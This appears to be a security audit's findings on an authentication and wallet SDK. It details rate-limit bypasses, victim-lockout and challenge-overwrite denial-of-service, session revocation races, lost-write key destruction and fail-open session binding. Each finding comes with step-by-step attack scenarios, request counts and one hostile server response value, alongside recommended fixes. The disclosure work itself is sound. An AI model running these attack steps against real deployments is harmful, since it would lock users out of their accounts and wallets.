raw_findings.attack_scenario: Attacker targets victim@example.com. He derives a candidate appKey = PBKDF2(guess, SHA-256(appId:normalized-email)), asks `/challenge` with `VICTIM@example.com` (200, real challenge for the victim's account), signs it with the derived auth key, and POSTs `/login` with `VICTIM@example.com`. On failure only the bucket `ratelimit:login:{appId}:VICTIM@example.com` is charged. He rotates the capitalization pattern every `maxAttempts` failures and grinds the passkey at full request rate forever. Verified empirically against dist: with maxAttempts=3, each of 4 case variants of the same registered account independently returned 401,401,401,429 — 16 attempts where the design permits 3 — and `/challenge` with the ALL-CAPS address returned 200 with a valid challenge for the victim's account.

Add a route test asserting mixed-case variants of one address share a bucket.

No test in tests/rate-limit-*.test.ts, tests/audit-*.test.ts or tests/multi-app.test.ts varies email case against a bucket. Confirmed novel and confirmed live against dist/.

raw_findings.title: Unauthenticated attacker holds a named victim out of /challenge — and therefore out of their wallet — with 11 requests per minute
raw_findings.description: `/challenge` is rate-limited BEFORE issuance on a bucket whose identifier is the caller-supplied email or publicKey, and unlike `/login` (verify-first, penalize-on-failure) the counter is charged on EVERY request including successful ones. A challenge is mandatory for both the email flow and the wallet flow, so exhausting a victim's `challenge` bucket denies login entirely. The prior audit fixed a strictly weaker variant — tests/rate-limit-sustained-lockout.test.ts proved the KV counter used to self-extend forever under a 1-req/45s trickle, and store.ts:250-266 now heals only ONCE per window — but the underlying attacker-chosen-bucket lockout is untouched, and the code concedes it: 'the residual per-target DoS is the developer's edge to own'. The surviving test only asserts that 'a victim recovers once an attacker STOPS'.
raw_findings.attack_scenario: For any deployment with derivable addresses (the test file itself cites Tetrac's own `{telegramId}@telegram.tetrac.xyz`) or for any Web3 account (the publicKey is on-chain and public), an attacker sends 11 `/challenge` requests per 60s window naming the victim. Every subsequent victim request — from any device, any IP, with correct credentials — returns 429, so the victim can never obtain a challenge, never completes `/login` or `/login-wallet`, and cannot reach the wallets whose ciphertext only their session can fetch. Cost: 11 HTTP requests/minute from one host, no account, no auth. Verified against dist: 11 attacker requests, then the victim's own /challenge → 429.

routes.ts:222-226

      `if (identifier) {`
      `  const limited = await rateLimited(req, { endpoint: "challenge", appId, identifier });`
      `  if (limited) return limited;`
routes.ts:220-221  `// Per-target keying still avoids the global "unknown" lockout (H5); the residual per-target DoS is the developer's edge to own.`
tests/rate-limit-sustained-lockout.test.ts:62  `it("a victim recovers once an attacker STOPS (the limiter throttles, as designed)"`
raw_findings.recommendation: Do not charge the target's bucket for requests that cannot be attributed to the target. In order of strength: (a) require a proof-of-work / captcha token on `/challenge` and key the limit on THAT rather than on the victim's identity; (b) split the counter into a generous non-blocking per-identity budget plus a source-derived budget that actually gates (which needs a working IP leg — see the trustProxyHeaders finding); (c) at minimum, return the still-valid cached challenge instead of 429 when the identity bucket is exhausted, so an attacker can degrade throughput but never deny login. Document the residual (README.md and SECURITY.md are currently 0 bytes).

No test asserts a victim can still log in while an attacker sustains 11 req/min against their /challenge bucket — confirmed live against dist/.

raw_findings.title: Attacker can invalidate a victim's in-flight challenge at will (single-slot challenge, unauthenticated re-issue), and the victim's resulting failures burn the victim's own login budget
raw_findings.description: Challenges are stored one-per-(appId, publicKey) and `putChallenge` OVERWRITES (KV `set`; SQL upsert on PK (app_id, public_key)). `/challenge` is unauthenticated and does not require the account to exist, so anyone who knows a victim's email or public key can replace the victim's pending challenge at any moment. `consumeChallenge` then compares the presented value against the attacker's replacement and fails. This defeats the AUTHSESSION-3 guarantee ('a valid login is never blocked by an attacker's failed attempts') from a direction the fix never considered: the victim's login now fails on its own merits, and routes.ts:377 charges those failures to the VICTIM's login bucket, so after 10 honest attempts the victim is also 429'd. The attack needs no rate-limit exhaustion at all, and the window is wide because the client performs a 600k-iteration synchronous PBKDF2 (~7 s at the default securityLevel 2) between fetching the challenge and submitting the login.
raw_findings.attack_scenario: Attacker fires one `/challenge` for the victim's email every ~6.5 s (9/min, under the 10/60s cap). Any victim login straddling one of those ticks — and the victim's own PBKDF2 derivation alone spans ~7 s — submits a challenge that has already been replaced, gets 401 'Invalid credentials', and increments the victim's failure counter; ten attempts and the victim is hard-429'd. The attack degrades gracefully into the /challenge lockout finding: pushing past the cap locks the challenge bucket instead. Either branch denies login. Verified against dist: victim obtains C1, attacker calls /challenge once, victim's correctly-signed login with C1 → 401; the identical flow without the attacker's call → 200.

  `await store.putChallenge(appId, publicKey, challenge, config.challengeTtlSeconds);`
src/storage/store.ts:211-215  `await this.kv.set(appScoped(this.prefixes.challenge, appId, publicKey), challenge, { exSeconds: ttlSeconds });`   // unconditional overwrite
src/storage/sql/engine.ts:133-134  `INSERT INTO ${t.challenges} ...` + `this.dialect.upsert(["app_id", "public_key"], ["challenge = ?", "expires_at = ?"])`   // upsert on PK (app_id, public_key)
src/server/routes.ts:377  `const limited = await rateLimited(req, { endpoint: "login", appId, identifier: body.email });`   // the victim's induced failures feed this
raw_findings.recommendation: Allow N concurrent live challenges per identity instead of one slot: store under a key that includes the challenge value (or a nonce echoed back to the client) and have `takeChallenge` atomically delete the specific presented value. Replay stays impossible (each value single-use) but an attacker can no longer evict a challenge he does not hold. Independently, do not charge a failed `/login` to the victim's bucket when the failure is 'challenge missing/mismatched' rather than 'signature invalid'.

That is the opposite vector: it protects against consuming, not against re-issuing/overwriting. tests/concurrent-safety.test.ts covers getdel atomicity only. No test issues two challenges for one identity and replays the first — confirmed live against dist/.

raw_findings.title: Global "unknown" IP bucket is ENFORCED whenever trustProxyHeaders=true — one client locks out every user of every tenant
raw_findings.description: `rateLimited()` gates on the IP bucket based on the CONFIG FLAG, not on whether a trustworthy IP was actually derived. `clientIp()` returns the constant string "unknown" whenever x-forwarded-for is absent/empty AND x-real-ip is absent, and also whenever `trustedProxyHops` exceeds the chain length (idx < 0 falls through). That constant becomes the identifier of a bucket carrying NO appId, which `rateLimitKey` renders as the single key `ratelimit:ip:unknown` — deliberately global across every endpoint and every tenant. The in-code comment claims exactly this hazard is avoided ('otherwise clientIp() is the constant "unknown" and gating on it would be a GLOBAL lockout vector — one abuser would lock out everyone — so we skip it'), but the skip is conditioned on `config.trustProxyHeaders` rather than on the returned value, so the protection evaporates in precisely the deployments that enable the IP leg.
raw_findings.attack_scenario: Two reachable triggers. (1) Direct-origin: the app trusts proxy headers but its origin is reachable without traversing the proxy (self-hosted Node behind nginx with the app port exposed, a container reachable in-VPC, a *.onrender.com/*.fly.dev origin URL). The attacker sends 11 header-less requests per minute; every request that also derives "unknown" is 429'd on /challenge, /register, /login, /login-wallet, /connect-wallet and /search-wallet ACROSS ALL appIds sharing the database. (2) Misconfiguration: `trustedProxyHops` set higher than the real chain (the SDK validates nothing, and tests/clientip-proxy.test.ts:51 even exercises hops=5) makes EVERY request derive "unknown", capping the entire deployment at 10 requests/minute. Verified against dist: with trustProxyHeaders=true and no XFF, four /challenge requests for four DIFFERENT appIds and four different publicKeys returned 200,200,200,429; with trustedProxyHops=2 and a one-entry XFF, four DIFFERENT client IPs returned 200,200,200,429.

raw_findings.recommendation: Make the guard depend on the VALUE, not the flag: have `clientIp` return `null` when it cannot attribute the request, and skip (or hard-reject) rather than bucket everyone together — `const ip = clientIp(...); if (ip) { ...check... }`. Additionally warn/refuse at startup when `trustProxyHeaders` is true and requests keep deriving "unknown" (a near-certain hops misconfiguration).

No test exercises trustProxyHeaders=true with the header ABSENT, and none asserts the route-level consequence of the shared bucket. grep -rn 'unknown' tests/rate-limit-*.test.ts → only the comment at rate-limit-self-extend.test.ts:10 ('The "unknown" IP bucket behavior with trustProxyHeaders=false'), i.e. the safe direction only.

raw_findings.title: Anonymous, unbounded, permanent storage growth via /register — the limiter structurally cannot fire
raw_findings.description: `/register` for authMethod 'email' requires no signature, no challenge, no email ownership and no session — only a well-formed base58 publicKey and any 64-hex `authPublicKey`. Its rate-limit bucket is keyed on `body.email ?? body.publicKey`, i.e. on a value the ATTACKER mints fresh for every request, so the counter is always 1 and the limit never trips. With `trustProxyHeaders` defaulting to false (config.ts:163) the IP leg is skipped entirely, so in the default configuration there is NO throttle of any kind on this path. The resulting `ttc_users` rows / `pubKey:` values carry no TTL and are never swept (`sweepExpired` iterates only sessions, challenges and rateLimits — engine.ts:299). The same shape applies to `/challenge` (writes a 300 s challenge row per attacker-chosen publicKey, no account required) and to the rate-limit table itself, where each fresh identifier inserts a new row.
raw_findings.attack_scenario: Attacker loops: generate a Solana keypair client-side, POST /register with that publicKey, a random authPublicKey and 16 wallet entries. Each request permanently creates one user record; with the missing `role` length cap (separate finding) each record is arbitrarily large. Nothing rate-limits it, nothing expires it, and nothing distinguishes the rows from real users, so the integrator cannot safely clean up. Verified against dist: with maxAttempts=3/60s, 50/50 anonymous registrations were accepted and 5,018,297 bytes of user records were written from 50 requests.

      `  endpoint: "register",`

      `});`

raw_findings.recommendation: Gate account creation on something the attacker cannot mint for free: require a proof-of-work / captcha / invite token on `/register`, or make the email path consume a challenge the way authMethod 'wallet' already does (routes.ts:306-312). Independently, offer a source-derived limit that works without a trusted proxy (an integrator-supplied `getClientId(req)` hook) and document that `allowedAppIds` plus a swept database are mandatory in production.

raw_findings.title: EncryptedWallet.role has no length bound while every sibling field does — one request can persist an arbitrarily large record
raw_findings.description: `validateWallets` bounds the array (16), `publicKey` (128 chars), `encryptedSecret` (8192 chars) and constrains `chain` to an enum — but `role` is only checked for being a non-empty string. The implied ~128 KB ceiling on a wallets[] payload is therefore not a ceiling at all. This is the amplification factor on the anonymous-registration finding, and it also applies to the authenticated `/import-wallet` path, where `maxWalletsPerUser` bounds the COUNT (64) but not the SIZE, so one user record can be inflated far past the '~15 KB at the 64-wallet cap' the Postgres DDL comment assumes.
raw_findings.attack_scenario: Attacker POSTs /register (unauthenticated) with 16 wallet entries whose `role` is a 10 MB string: one request → a 160 MB permanently-stored user record that must be JSON.parse'd on every subsequent getUser for that key. Repeat with fresh publicKeys (no rate limit applies) to fill the database and make each read of a poisoned record expensive. Verified against dist: a `role` of 100,000 characters was accepted and persisted; 50 such registrations stored 5 MB.

raw_findings.title: Client applies the server-supplied PBKDF2 iteration count without bounds — hostile server or MITM freezes the browser
raw_findings.description: The server validates client-supplied `pbkdf2Iterations` into [100_000, 1_000_000] on registration (routes.ts:96-100, 273-275 — 'audit F3'), but the reverse direction is unchecked: `loginWithEmail` takes whatever number `/challenge` returns and feeds it straight into `deriveAppKeyFromPasskey`, which runs a SYNCHRONOUS @noble/hashes PBKDF2 on the calling thread. No upper bound, no integer check, no worker offload. The stated threat model includes a network attacker and a hostile app operator, both of whom control that response.
raw_findings.attack_scenario: A MITM (or a compromised/hostile app backend, or an operator wanting to stall a user mid-withdrawal) returns `{"challenge":"…","pbkdf2Iterations":5000000000}` from POST /challenge. `pbkdf2(sha256, …, { c: 5e9 })` then executes on the browser's main thread: the tab hangs with no progress, no timeout and no cancel, on every login attempt. A downgraded count is not a key compromise (it derives the wrong key and simply fails), so the impact is availability, not confidentiality.

raw_findings.title: KV rate-limit self-heal fires exactly once per window; a single failed `expire` at that count causes a PERMANENT lockout with no reset path
raw_findings.description: `KvAuthStore.hitRateLimit` stamps the TTL on `count === 1` and re-stamps on `count === maxAttempts + 1` only. Narrowing from `count > maxAttempts` was the correct fix for the self-extension DoS, but it makes the heal non-idempotent and single-shot: if that one `expire` does not land — a transient Redis/Upstash error (which propagates and 500s the request, correctly fail-closed), a serverless invocation killed between the two REST round-trips, a dropped connection — the counter is left with NO TTL, every later hit yields a strictly greater count that can never equal `maxAttempts + 1` again, and that identifier is rate-limited FOREVER. Identifiers are victim emails and public keys, so this is exactly the permanent-lockout class the file's own comments call 'unrepresentable'. The SDK exposes no admin/reset API to clear a stuck bucket.
raw_findings.attack_scenario: Not directly attacker-triggerable, but attacker-influenced: an attacker who repeatedly pushes a victim's bucket past the cap (11 requests/window) maximizes how often the fragile once-per-window `expire` runs under load — and load is when backend calls fail. One failure permanently bricks that victim's ability to obtain a challenge or log in until an operator manually deletes the Redis key, a procedure no documentation describes and no API exposes.
raw_findings.evidence:
src/storage/store.ts:244-266
    `const count = await this.kv.incr(key);`
    `if (count === 1) {`
    `  await this.kv.expire(key, windowSeconds);`
    `} else if (count === maxAttempts + 1) {`
    `  // Self-heal, ONCE per window — deliberately not on every over-limit hit.`
    `  await this.kv.expire(key, windowSeconds);`
    `}`

raw_findings.recommendation: Make the counter self-expiring rather than heal-dependent: `SET key 1 EX w NX` + `INCR`, a Lua script, or `EXPIRE key w NX` (Redis ≥7) issued on every hit — idempotent, never re-extends the window, and removes the single point of failure. The SQL engine already has this property via the CASE (engine.ts:251-254).

The residual is acknowledged in the store.ts comment ('heals that within at most maxAttempts further requests, which is all the guarantee is worth') but is untested and undocumented for integrators.

raw_findings.title: No request-body size limit anywhere; JSON is fully buffered and parsed before any rate-limit or auth check
raw_findings.description: `readJson` calls `await req.json()` with no size cap, and every handler parses the body BEFORE `rateLimited()` runs (and for /import-wallet, after auth but still unbounded). Field-level caps (wallets ≤16, encryptedSecret ≤8192, email ≤320) are all applied post-parse, so they bound what is STORED, never what is READ. The SDK ships as a framework-agnostic Web `Request` handler and documents no deployment requirement for a body limit — README.md and SECURITY.md are 0 bytes — so whether anything caps it depends entirely on the host (Next.js App Router route handlers do not apply the Pages-API/Server-Action body limit).
raw_findings.attack_scenario: An attacker POSTs a multi-hundred-megabyte JSON body to /challenge or /register. The runtime buffers and parses it (memory + CPU) before a single rate-limit counter is touched; a handful of concurrent requests exhausts a serverless function's or container's memory. No account, no auth, and the per-identifier limiter is irrelevant because the cost is incurred before it runs.

raw_findings.recommendation: Check `content-length` (and stream-count the body when the header is absent) inside `readJson`, rejecting over a configurable `maxBodyBytes` (e.g. 256 KB — comfortably above 16 wallets × 8 KB) with 413 before parsing. Document the limit and the expectation that a fronting proxy also enforces one.
raw_findings.prior_art_check: grep -rni 'content-length|maxBody|body size|payload too large|413' src/ tests/ *.md → zero hits anywhere in the repository.

raw_findings.title: sweepExpired is never scheduled by the SDK; SQL deployments retain expired sessions, challenges and PII-bearing rate-limit rows indefinitely
raw_findings.description: `SqlAuthStore.sweepExpired` and `MemoryAdapter.sweepExpired` exist and are correct, but nothing in the SDK ever calls them — call sites appear only in tests/ and storage/conformance.ts. Expiry is enforced on read (invariant 1, correctly), so this is not a correctness bug; it is unbounded growth of `ttc_sessions`, `ttc_challenges` and `ttc_rate_limits` on every SQL backend. Combined with the anonymous-write findings, an attacker adds one `ttc_rate_limits` row per distinct identifier and one `ttc_challenges` row per distinct publicKey, none ever removed. The engine's own comment states these rows embed emails and IPs and calls it 'a data-retention obligation' — an obligation the integrator is never told about, because README.md and SECURITY.md are empty files.
raw_findings.attack_scenario: An attacker sends unthrottled /challenge requests with fresh random publicKeys: each writes one challenge row and one rate-limit row keyed on that publicKey. On a Postgres/MySQL/SQLite deployment with no cron wired, these rows accumulate permanently — disk growth, index bloat, slower PK lookups, and a growing corpus of attacker-chosen data plus real users' emails and IPs sitting in every backup.
raw_findings.evidence:
src/storage/sql/engine.ts:293-295
   `* Reclaim expired rows. SPACE ONLY … Wire it to a cron.`
   `* This is not merely housekeeping: rate-limit rows embed **emails and IPs**.`
   `async sweepExpired(limit = 1000): Promise<number> {`
grep -rn 'sweepExpired' src/ → definitions at memory.ts:101, engine.ts:295, store.ts:140/163/171; call sites only in storage/conformance.ts and tests/. No scheduler, no startup hook, no docs.
`ls -la README.md SECURITY.md` → both 0 bytes.
raw_findings.recommendation: Ship an opt-out background sweeper (`createAuthHandlers({ sweepIntervalMs })` calling `store.sweepExpired?.()` on a timer, guarded for serverless where timers do not persist) plus an exported `sweep()` handler integrators can hit from a Vercel/GitHub cron. At minimum, restore README/SECURITY content documenting: wire a cron, set `allowedAppIds`, set `trustProxyHeaders`/`trustedProxyHops` correctly, and the accepted per-target DoS residual.
raw_findings.prior_art_check: tests/v050-storage-seam.test.ts:110-158 and storage/conformance.ts:430-455 verify sweepExpired's behavior and honest feature-detection, but nothing asserts it is ever invoked by the SDK itself. .claude/skills/multi-database/SKILL.md:145 instructs a backend AUTHOR to wire it, which is not the same as telling an integrator.

raw_findings.title: When enabled, the IP bucket is global across all endpoints and tenants, counts successful requests, and is 10/60s — shared-egress populations lock themselves out
raw_findings.description: The IP bucket deliberately carries no appId, so one counter covers /challenge, /register, /login, /login-wallet, /connect-wallet and /search-wallet for EVERY app sharing the database, and it is charged on successful requests too (only /login and /login-wallet are verify-first). At the default 10 attempts / 60 s, a normal email login costs 2 hits (/challenge + /login), so one source IP supports roughly five logins per minute across the whole deployment. Behind CGNAT, a corporate NAT, a VPN exit or a mobile carrier gateway, thousands of unrelated users share that budget.
raw_findings.attack_scenario: No attacker is required — it is self-inflicted the moment `trustProxyHeaders` is turned on (the only configuration in which IP limiting exists at all). An attacker can accelerate it: sharing an exit IP with the victim population (same VPN, same office, same carrier) lets them spend the shared budget deliberately, denying login to everyone behind that egress across every tenant. Confirmed by construction in tests/clientip-proxy.test.ts:65-76, which asserts that one source IP shares a bucket across different targets.
raw_findings.evidence:
src/storage/store.ts:185-187
    `// Mirrors the historical layout: `ratelimit:{endpoint}:{appId}:{identifier}`, and`
    `// `ratelimit:ip:{identifier}` for the app-agnostic IP bucket.`
    `const scope = b.appId === undefined ? b.endpoint : `${b.endpoint}:${b.appId}`;`
src/server/routes.ts:125-126  `// The IP bucket carries no appId on purpose: it is global across endpoints and apps, so one abusive IP is throttled everywhere at once.`
src/core/config.ts:172-175  `rateLimit: {` / `windowSeconds: 60,` / `maxAttempts: 10,` / `},`
raw_findings.recommendation: Give the IP bucket its own, much larger budget (a separate `ipRateLimit: { windowSeconds, maxAttempts }`) instead of reusing the per-identity numbers, and scope it per endpoint so a burst of /search-wallet lookups cannot deny logins. Document the NAT/CGNAT consequence next to `trustProxyHeaders`.
raw_findings.prior_art_check: tests/clientip-proxy.test.ts:64-88 characterizes the per-source bucket as intended behavior, and tests/audit-server.test.ts:82-91 relies on it for enumeration hardening. Neither considers shared-egress populations, and no test asserts a separate or larger budget for the IP leg. Reported as info: this is the documented design, flagged as a sizing footgun rather than a bug.

raw_findings.title: Single-active-session revocation is a non-atomic read-modify-write: concurrent logins leave a live, permanently un-revocable orphan session
raw_findings.description: `issueSession` implements the "single active session" guarantee by reading `user.authTokenHash` from the UserData snapshot the route handler loaded earlier, deleting that one session, minting a new one, and writing the whole record back. There is no compare-and-swap, no lock, and no per-user session index. Two overlapping session issuances for the same user therefore both read the SAME `previousHash`, both delete it, and both `putSession` — leaving TWO live sessions while the user record records only the last writer's hash. The first token is then orphaned: it is live in the session keyspace but referenced by nothing, so no future login can ever revoke it (a later login deletes only the recorded hash) and `logout` revokes only the token the caller presents. Since the SDK exposes no "revoke all sessions" endpoint, the orphan is un-revocable by any mechanism the SDK provides and survives until `sessionTtlSeconds` (default 4h) elapses. This directly contradicts the documented guarantee in src/core/config.ts:105 ("Each new login also revokes the prior token") and in the code comment at session.ts:46-49 ("so an old leaked token can't outlive the next login"). Reachability through the HTTP routes is narrowed — but not closed — by the single challenge slot per (appId, publicKey): the window is the interval between request A's `consumeChallenge` returning and its final `persistUser`, which is 4 store round-trips (deleteSession, putSession, set user, hset email index). On a REST-based store (Upstash/Vercel KV) that is tens to hundreds of milliseconds, ample for a second, already-in-flight login to complete its `getUserByPublicKey` on the stale record.
raw_findings.attack_scenario: An attacker with transient credential access (shared/kiosk device, a passkey observed once, a wallet the victim signed with once) pipelines two logins so that the second request's `getUserByPublicKey` lands inside the first request's `issueSession` window. Both succeed; the attacker now holds two valid bearer tokens but the victim's record names only one. The victim, suspecting compromise, logs out (revokes the presented token) and logs in again (revokes the recorded hash). Both of the SDK's revocation mechanisms miss the orphan, which continues to authenticate `/user-data` (full encrypted-wallet bundle) and `/import-wallet` (attacker ciphertext injection, cf. tests/audit-zai-glm-52.test.ts F4) for the full session TTL. Verified end-to-end: after two overlapping issuances both tokens are live; after a third ordinary login `tokenA live: true`, and `h.userData()` with tokenA returns 200.
raw_findings.recommendation: Stop deriving revocation from a single scalar on the user blob. Either (a) key sessions by owner as well as token — `sessions(app_id, public_key, token_hash)` with `DELETE ... WHERE app_id=? AND public_key=?` before insert, which revokes ALL prior sessions atomically regardless of what the stale snapshot said, or (b) add `AuthStore.deleteSessionsForUser(appId, publicKey)` to the port and call it in `issueSession` instead of `deleteSession(previousHash)`. Option (a) also gives the SDK a real "log out everywhere" primitive it currently lacks. At minimum, add a conformance/route test that runs two overlapping issuances and asserts exactly one live session.
raw_findings.prior_art_check: grep -rn "orphan|single active|revoke" tests/ src/ — tests/concurrent-safety.test.ts:122 covers only "sequential logins: second login revokes the first token"; its file header claims "Concurrent session issuance (old token revoked before new one)" but the only test in that describe block is sequential. tests/server.test.ts:206 ("a new login revokes the previous session token") is also sequential. tests/v050-storage-seam.test.ts:66 is sequential. grep for "Promise.all" combined with login/session in tests/ returns nothing. src/storage/conformance.ts:232 only asserts `deleteSession` removes one key. No test exercises overlapping issuance.

raw_findings.title: issueSession rewrites the whole UserData blob from a stale snapshot, silently destroying a concurrent import-wallet's encrypted key material
raw_findings.description: `issueSession` ends with `await persistUser(store, user)` — a full-blob overwrite of the UserData record using the snapshot the login route read at the top of the request. `importWallet` does the same thing with its own snapshot (routes.ts:537-538). Neither carries a version, ETag, or conditional write; `AuthStore.putUser` is an unconditional upsert on every backend (KvAuthStore: `this.kv.set(...JSON.stringify(user))`; SqlAuthStore: `INSERT ... ON CONFLICT DO UPDATE SET data = ?`). If a session issuance overlaps an import, whichever write lands last wins the ENTIRE record — so the login's stale snapshot silently deletes the just-imported `encryptedSecret`. In a non-custodial design the server holds the only copy of that ciphertext: losing it is permanent, unrecoverable loss of the user's private key, and it is silent (the import already returned 200 with the wallet present). The AuthStore contract in src/storage/store.ts:96-98 explicitly promises no-lost-write for the EMAIL INDEX ("Concurrent putUser for the same email under two different appIds must not lose either write") but says nothing about the wallets array, and no backend guards it.
raw_findings.attack_scenario: Primary path is user-triggered rather than attacker-driven, but the consequence is asset destruction: a user imports a wallet in one tab while a second tab (or a mobile client, or an auto-retry) completes a login; the imported key's ciphertext is dropped and the key is gone forever. Attacker-assisted variant: an attacker holding a stolen bearer token (the SDK stores it in localStorage, so any XSS yields it) repeatedly calls `/import-wallet`, each call rewriting the record from its own snapshot; any concurrent legitimate write by the victim — including the victim's own re-login, which is the SDK's advised remediation for a suspected compromise — is clobbered. Verified: importWallet returns 200 with 2 wallets, then a concurrent issueSession lands and the record is back to 1 wallet, ["CT0"], with "CT_IMPORTED" gone.
raw_findings.recommendation: Split the session pointer off the user blob (it does not belong there — see finding 1's recommendation), so a login never rewrites the wallets array at all. For `importWallet`, make the append a conditional/atomic operation: on SQL, an `UPDATE ... WHERE data->>'version' = ?` optimistic-concurrency check or a separate `wallets` table with its own rows; on the KV port, a version field checked with WATCH/Lua or a per-wallet key. Add a conformance case: concurrent `putUser` of two different wallet appends must not lose either.
raw_findings.prior_art_check: grep -rn "authTokenHash" src tests — only session.ts, routes.ts (stripping it from responses) and tests/v050-storage-seam.test.ts (which asserts the hash is written and not echoed). grep for lost-update/wallet-clobber coverage: tests/concurrent-safety.test.ts covers concurrent registration (email index) and concurrent connect-wallet (challenge slot) but has no test where a wallet append races another write. src/storage/store.ts:96-98 documents the no-lost-write requirement only for the email index; src/storage/conformance.ts contains no wallets-array concurrency case.

raw_findings.title: Unauthenticated /challenge overwrites a victim's pending challenge, turning the victim's CORRECT login into a 401 that feeds their own login-failure counter
raw_findings.description: Challenges are stored in a SINGLE slot per (appId, publicKey) — `putChallenge` is an unconditional upsert on the key `challenge:{appId}:{publicKey}` — and `/challenge` requires no authentication: any caller who knows a victim's email (or public key) can mint a challenge into the victim's slot. `consumeChallenge` then does an atomic take of whatever is currently in the slot and constant-time-compares it to what the caller presented, so a victim who fetched challenge C1, spent ~7s deriving their app key (600k PBKDF2 at the default securityLevel 2), and submitted a perfectly valid signature over C1 gets `stored = C2 != C1` -> `consumed = false` -> falls through to `rateLimited(... endpoint: "login", identifier: body.email)` -> 401 Invalid credentials, AND their attempt increments the victim's own login-failure bucket. This is precisely the state AUTHSESSION-3 was designed to make impossible; the mitigation as implemented ("Verify the signature FIRST, then rate-limit only on FAILURE... an attacker spamming failed logins for a victim's email cannot lock the victim out of their own correct login") only covers attackers who submit junk LOGINS. An attacker who submits CHALLENGES re-opens it, because the victim's own correct login is now classified as a failure. The `/challenge` per-target bucket bounds the attacker to `rateLimit.maxAttempts` writes per window, but that bucket is SHARED with the victim's own `/challenge` calls, so the attacker's traffic also starves the victim's ability to obtain a fresh challenge at all.
raw_findings.attack_scenario: Attacker knows target@example.com (emails are not secret; `/challenge` also confirms account existence via 200-vs-400). Attacker sends `/challenge {email}` at the per-target limit. Every login the victim attempts in that window returns 401 on correct credentials and burns one slot of the victim's login-failure budget; once that budget is spent the victim is 429'd, and the shared challenge bucket 429s their next `/challenge` too. Cost to the attacker is `rateLimit.maxAttempts` unauthenticated POSTs per window (default 10/60s) per victim. Verified: victim login with a correct signature over their own freshly-issued challenge returns 401 after a single attacker `/challenge`, while the identical flow without the clobber returns 200.
raw_findings.recommendation: Do not let a new challenge destroy an unspent one. Two options: (a) store challenges keyed by the challenge value itself (`challenge:{appId}:{publicKey}:{challengeHash}`) with a small bounded set per identity, so N outstanding challenges coexist and each is independently single-use; or (b) make `putChallenge` a set-if-absent that returns the existing live challenge instead of overwriting. Separately, do not count a `consumed === false` outcome against the login-failure bucket when `sigValid === true` — a valid signature over a stale challenge is a liveness failure, not a credential failure, and counting it is what converts the clobber into a lockout.
raw_findings.prior_art_check: grep -rn -i "overwrit|clobber|poison|second challenge|latest challenge" tests/ — nothing on challenge overwriting. tests/audit-server.test.ts:144-168 ("AUTHSESSION-3 RESOLVED") asserts the opposite invariant holds and only exercises an attacker sending junk LOGINS, never junk CHALLENGES. tests/audit-zai-glm-52.test.ts:216-232 (P1) covers single-use via getdel but not overwrite. The routes.ts:215-221 comment acknowledges only "the residual per-target DoS" on /challenge rate limiting; it does not acknowledge the single-slot clobber or the login-counter poisoning.

raw_findings.title: bindSessionToUserAgent fails OPEN: a login carrying no User-Agent silently mints an unbound session usable from any client
raw_findings.description: `hashUserAgent` returns `undefined` for a missing or empty UA, and `issueFingerprint` passes that straight through to `issueSession`, which builds `value` without a `fingerprint` field when the argument is falsy. `verifySession` only enforces the fingerprint `if (session.fingerprint)`. Consequence: with `bindSessionToUserAgent: true`, any client that simply omits the `User-Agent` header on its login/register request receives a session that is NOT bound and is thereafter accepted from any User-Agent, with no error, no warning, and no way for the operator to tell. The binding is thus client-electable rather than server-enforced. This is a fail-open on a control the deployment explicitly turned on. It also bites benign integrators: Node's `fetch`/undici, React Native, and many server-to-server clients send no User-Agent by default, so a mobile or SSR integration would silently run with the binding disabled while the operator believes it is on.
raw_findings.attack_scenario: A malicious or modified client that has legitimately obtained credentials (or is simply the attacker's own account on a shared deployment) logs in with `User-Agent` stripped, obtaining a session that carries no fingerprint. The token is then freely portable to any tool, curl, or headless environment — the exact scenario `bindSessionToUserAgent` exists to raise the bar against — while the operator's dashboards and the session store show nothing unusual (the stored value is the bare publicKey, indistinguishable from a binding-off deployment). Verified: with `bindSessionToUserAgent: true` and no UA on the register request, the stored session value is the bare `AKnL4NN...` public key with no `|fingerprint` suffix, and `/user-data` with `user-agent: curl/8` returns 200.
raw_findings.recommendation: When `bindSessionToUserAgent` is on, treat a missing UA as a distinct bound value rather than as "unbound" — e.g. bind to `hashUserAgent(ua ?? "�no-ua")` so a UA-less client is pinned to the UA-less fingerprint and cannot later present a real UA (and vice versa). Alternatively reject the login with 400 when the flag is on and no UA is present. Either way, add the missing test to tests/session-fingerprint.test.ts: "binding on + no UA at ISSUE time" (the suite currently only covers no-UA at VERIFY time).
raw_findings.prior_art_check: Read tests/session-fingerprint.test.ts in full. Its five cases are: binding off (stored value is bare publicKey), binding on with UA_A at issue (bound), binding on rejects a different UA, binding on rejects a request with NO UA at VERIFY time (line 80-86), and per-session enforcement after the flag is disabled. Every one of them calls `register(h, UA_A)` — i.e. always supplies a UA at ISSUE time. grep -rn "user-agent|hashUserAgent|bindSessionToUserAgent" tests/ src/ confirms no other coverage.

raw_findings.title: resolveConfig lets an explicit `undefined` (or 0) erase sessionTtlSeconds, producing a NEVER-EXPIRING session token on every KV backend
raw_findings.description: `resolveConfig` merges with an object spread: `{ ...DEFAULT_CONFIG, ...override }`. Object spread copies own enumerable keys INCLUDING those whose value is `undefined`, so `resolveConfig({ sessionTtlSeconds: undefined })` yields `sessionTtlSeconds: undefined`, not the 14400 default. There is no validation of the resulting value anywhere. That value flows to `store.putSession(appId, tokenHash, value, config.sessionTtlSeconds)` and then, on every KV adapter, through a TRUTHINESS check on `exSeconds` — so `undefined` and `0` both mean "no TTL at all" and the session is written as a permanent key. `sweepExpired` cannot reclaim it either (it only removes entries with an `expiresAt`). The SQL backend does the opposite with the same config: `expiresAt = now() + 0` and every read filters `expires_at > ?`, so the session is dead on arrival. Same configuration, opposite behaviour, one of which is an immortal bearer token. Plausible triggers: `sessionTtlSeconds: process.env.TTL ? +process.env.TTL : undefined` with the env var unset; a config builder that assigns keys from a partially-populated object; or an integrator who reads `0` as "no expiry policy".
raw_findings.attack_scenario: No attacker action is needed to create the condition — a deployment misconfiguration silently converts every issued bearer token into a permanent credential. The attacker payoff is that the SDK's stated compensating control for token theft disappears: src/core/config.ts:104-105 sells the 4h TTL as the backstop ("a leaked bearer token dies sooner") and src/client/authClient.ts:463-470 relies on it explicitly for logout ("if it fails, the token still dies at its server-side TTL"). With no TTL, a token captured once — from localStorage via XSS, from a proxy/CDN access log, from a leaked backup of the session table — authenticates forever, and the only revocation left is a successful login by that same user (which finding 1 shows is itself not reliable).
